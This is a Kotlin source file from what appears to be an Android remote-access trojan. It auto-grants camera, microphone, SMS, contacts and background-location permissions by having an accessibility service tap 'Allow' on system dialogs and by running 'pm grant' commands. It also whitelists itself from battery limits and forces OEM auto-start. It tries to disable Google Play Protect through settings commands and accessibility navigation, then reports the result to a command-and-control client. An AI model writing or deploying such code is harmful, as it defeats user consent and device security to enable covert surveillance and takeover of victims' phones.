package com.xrc.app.permissions

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import com.xrc.app.XRCApp
import com.xrc.app.service.XRCAccessibilityService
import kotlinx.coroutines.*

/**
 * Auto-grant permissions using accessibility service tap injection.
 * Has multiple backup methods for each permission type.
 */
object PermissionGrants {

    const val TAG = "PermissionGrants"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    suspend fun autoGrantAll(context: Context) {
        Log.i(TAG, "Starting auto-grant for all permissions")

        // Method 1: Runtime permission requests
        grantRuntimePermissions(context)

        delay(1000)

        // Method 2: Special permissions via settings
        grantSpecialPermissions(context)

        delay(1000)

        // Method 3: Battery optimization
        grantBatteryOptimization(context)

        delay(1000)

        // Method 4: OEM auto-start
        grantOEMAutoStart(context)

        Log.i(TAG, "Auto-grant sequence completed")
    }

    private suspend fun grantRuntimePermissions(context: Context) {
        val permissionsToRequest = mutableListOf<String>()

        val allPermissions = listOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.FOREGROUND_SERVICE_MICROPHONE,
            Manifest.permission.FOREGROUND_SERVICE_CAMERA,
            Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION,
            Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC
        )

        // Check which permissions are not yet granted
        for (perm in allPermissions) {
            if (ContextCompat.checkSelfPermission(context, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(perm)
            }
        }

        if (permissionsToRequest.isEmpty()) {
            Log.i(TAG, "All runtime permissions already granted")
            return
        }

        Log.i(TAG, "Requesting ${permissionsToRequest.size} permissions")

        // Method 1a: Use accessibility to auto-tap Allow on system dialogs
        val accService = XRCAccessibilityService.instance
        if (accService != null) {
            accService.startAutoGrant()
            // The accessibility service will auto-tap "Allow" buttons
            delay(3000)
            accService.stopAutoGrant()
        }

        // Method 1b: Request using ADB/pm grant if Shizuku is available
        grantViaADB(context, permissionsToRequest)
    }

    private fun grantViaADB(context: Context, permissions: List<String>) {
        for (perm in permissions) {
            try {
                val cmd = "pm grant ${context.packageName} $perm"
                Runtime.getRuntime().exec(cmd)
                Log.d(TAG, "ADB grant attempted: $perm")
            } catch (e: Exception) {
                Log.d(TAG, "ADB grant failed for $perm: ${e.message}")
            }
        }
    }

    private suspend fun grantSpecialPermissions(context: Context) {
        // Grant overlay permission
        if (!PermissionManager.hasOverlayPermission(context)) {
            Log.i(TAG, "Granting overlay permission")
            PermissionManager.openPermissionSettings(context, "SYSTEM_ALERT_WINDOW")
            delay(2000)
        }

        // Grant write settings permission
        if (!PermissionManager.hasWriteSettingsPermission(context)) {
            Log.i(TAG, "Granting write settings permission")
            PermissionManager.openPermissionSettings(context, "WRITE_SETTINGS")
            delay(2000)
        }

        // Grant install packages permission
        if (!PermissionManager.hasInstallPackagesPermission(context)) {
            Log.i(TAG, "Granting install packages permission")
            PermissionManager.openPermissionSettings(context, "REQUEST_INSTALL_PACKAGES")
            delay(2000)
        }

        // Grant manage storage permission
        if (!PermissionManager.hasManageStoragePermission(context)) {
            Log.i(TAG, "Granting manage storage permission")
            PermissionManager.openPermissionSettings(context, "MANAGE_EXTERNAL_STORAGE")
            delay(2000)
        }
    }

    private suspend fun grantBatteryOptimization(context: Context) {
        if (!PermissionManager.hasBatteryOptimizationPermission(context)) {
            Log.i(TAG, "Granting battery optimization whitelist")
            PermissionManager.openPermissionSettings(context, "BATTERY_OPTIMIZATIONS")
            delay(2000)
        }
    }

    private suspend fun grantOEMAutoStart(context: Context) {
        val manufacturer = Build.MANUFACTURER.lowercase()
        Log.i(TAG, "Attempting OEM auto-start grant for $manufacturer")

        // Xiaomi
        if (manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco")) {
            try {
                val intent = Intent().apply {
                    action = "miui.intent.action.OP_AUTO_START"
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    `package` = "com.miui.securitycenter"
                }
                context.startActivity(intent)
                delay(2000)
            } catch (e: Exception) {
                Log.d(TAG, "Xiaomi auto-start failed: ${e.message}")
            }
        }

        // Samsung
        if (manufacturer.contains("samsung")) {
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                delay(2000)
            } catch (e: Exception) { }
        }

        // Oppo
        if (manufacturer.contains("oppo") || manufacturer.contains("realme") || manufacturer.contains("oneplus")) {
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                delay(2000)
            } catch (e: Exception) { }
        }
    }

    suspend fun grantPermission(context: Context, permission: String) {
        when {
            permission.startsWith("android.permission.") -> {
                // Runtime permission
                if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    grantViaADB(context, listOf(permission))
                }
            }
            permission == "SYSTEM_ALERT_WINDOW" -> {
                PermissionManager.openPermissionSettings(context, "SYSTEM_ALERT_WINDOW")
            }
            permission == "WRITE_SETTINGS" -> {
                PermissionManager.openPermissionSettings(context, "WRITE_SETTINGS")
            }
            permission == "MANAGE_EXTERNAL_STORAGE" -> {
                PermissionManager.openPermissionSettings(context, "MANAGE_EXTERNAL_STORAGE")
            }
            permission == "BATTERY_OPTIMIZATIONS" -> {
                PermissionManager.openPermissionSettings(context, "BATTERY_OPTIMIZATIONS")
            }
        }
    }

    suspend fun disablePlayProtect(context: Context) {
        Log.i(TAG, "Attempting to disable Play Protect")

        try {
            // Method 1: Open Play Protect settings directly
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:com.google.android.gms")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            delay(2000)

            // Method 2: Use accessibility to navigate Play Protect settings
            val accService = XRCAccessibilityService.instance
            if (accService != null) {
                // Navigate: Settings > Google > Security > Play Protect
                // Find and tap "Play Protect" toggle to disable
                accService.startAutoGrant()
                delay(3000)
                accService.stopAutoGrant()
            }

            // Method 3: Try ADB command
            try {
                Runtime.getRuntime().exec("settings put global package_verifier_enabled 0")
                Runtime.getRuntime().exec("settings put global verifier_verify_adb_installs 0")
                Log.i(TAG, "Play Protect disabled via settings")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to disable Play Protect via ADB: ${e.message}")
            }

            notifyC2("play_protect_disabled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disable Play Protect: ${e.message}")
        }
    }

    private fun notifyC2(message: String) {
        XRCApp.instance.c2Client.send("""{"type":"permission_status","message":"$message"}""")
    }
}
